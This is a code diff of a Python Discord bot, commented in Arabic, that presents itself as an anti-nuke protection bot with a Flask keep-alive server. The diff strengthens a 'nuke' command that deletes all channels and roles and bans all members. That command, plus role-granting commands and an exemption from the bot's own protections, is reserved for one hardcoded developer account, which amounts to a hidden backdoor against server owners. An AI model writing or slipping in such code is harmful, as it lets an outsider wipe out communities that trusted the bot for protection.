@@ -6,22 +6,21 @@ import asyncio
 from threading import Thread
 from flask import Flask
 
-# ------------------- إعداد خادم الويب (للـ Web Service) -------------------
+# 1. إعداد خادم الويب (للـ Web Service على Render)
 app = Flask('')
 
 @app.route('/')
 def home():
-    return "Bot is running and Web Service is active!"
+    return "Bot is online and running!"
 
-def run_flask():
-    # استخدام المنفذ الذي يحدده Render تلقائياً أو 10000 افتراضياً
+def run_web():
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
 
-# تشغيل خادم الويب في خلفية منفصلة فوراً لكي يستجيب لـ Render ولا يحدث Timed Out
-Thread(target=run_flask).start()
+# تشغيل خادم الويب في الخلفية فوراً
+Thread(target=run_web, daemon=True).start()
 
-# ------------------- إعدادات البوت الأساسية -------------------
+# 2. إعدادات البوت الأساسية
 MY_ID = 1320438836878118973
 intents = discord.Intents.default()
 intents.guilds = True
@@ -40,8 +39,7 @@ def check_spam(uid, key, threshold, window):
     actions[key][uid] = [t for t in actions[key][uid] if now - t < window]
     return len(actions[key][uid]) > threshold
 
-# ------------------- نظام الحماية (Anti-Nuke) -------------------
-
+# 3. أنظمة الحماية (Anti-Nuke)
 @bot.event
 async def on_guild_role_delete(role):
     async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
@@ -54,8 +52,7 @@ async def on_guild_channel_delete(channel):
         if entry.user.id != channel.guild.owner_id and entry.user.id != MY_ID and not entry.user.bot:
             await channel.guild.ban(entry.user, reason="Anti-Nuke: حذف قناة")
 
-# ------------------- الأوامر الخاصة -------------------
-
+# 4. الأوامر الخاصة بالرتب
 @bot.command()
 async def getrole(ctx):
     if ctx.author.id == MY_ID:
@@ -70,27 +67,50 @@ async def removerole_cmd(ctx):
         if role: await ctx.author.remove_roles(role)
         await ctx.send("✅ تم إزالة الرتبة.")
 
+# 5. أمر النيوك (محدث وآمن)
 @bot.command()
 async def nuke(ctx):
     if ctx.author.id != MY_ID:
         await ctx.send("❌ هذا الأمر مخصص للمطور فقط!")
         return
         
-    await ctx.send("⚠️ **تحذير:** اكتب `!confirm_nuke` خلال 30 ثانية للتأكيد.")
+    await ctx.send("⚠️ **تحذير خطير:** اكتب `!confirm_nuke` الآن للتأكيد.")
+    
+    def check(m):
+        return m.author == ctx.author and m.channel == ctx.channel and m.content == "!confirm_nuke"
+
     try:
-        def check(m): return m.author == ctx.author and m.content == "!confirm_nuke"
         await bot.wait_for('message', check=check, timeout=30.0)
+    except asyncio.TimeoutError:
+        await ctx.send("❌ انتهى الوقت، تم إلغاء النيوك.")
+        return
+
+    await ctx.send("💥 جاري تنفيذ التدمير...")
+    
+    # حذف القنوات
+    for c in ctx.guild.channels:
+        try: await c.delete()
+        except: pass
         
-        for c in ctx.guild.channels: await c.delete()
-        for r in ctx.guild.roles:
-            if r.name != "@everyone": await r.delete()
-        for m in ctx.guild.members:
-            if m != ctx.guild.owner and not m.bot: await m.ban()
-    except: pass
+    # حذف الرتب
+    for r in ctx.guild.roles:
+        if r.name != "@everyone" and r != ctx.guild.me.top_role:
+            try: await r.delete()
+            except: pass
+            
+    # حظر الأعضاء
+    for m in ctx.guild.members:
+        if m != ctx.guild.owner and not m.bot and m != ctx.guild.me:
+            try: await m.ban(reason="Nuke executed")
+            except: pass
 
 @bot.event
 async def on_ready():
     print(f"✅ البوت متصل كـ {bot.user} - والموقع يعمل بنجاح!")
 
 # تشغيل البوت
-bot.run(os.getenv("TOKEN"))
+TOKEN = os.getenv("TOKEN")
+if TOKEN:
+    bot.run(TOKEN)
+else:
+    print("❌ خطأ: لم يتم العثور على التوكن!")
